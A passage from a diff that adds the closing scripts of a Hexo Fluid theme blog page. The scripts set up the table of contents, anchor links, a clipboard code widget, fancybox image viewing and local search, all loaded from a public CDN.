+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
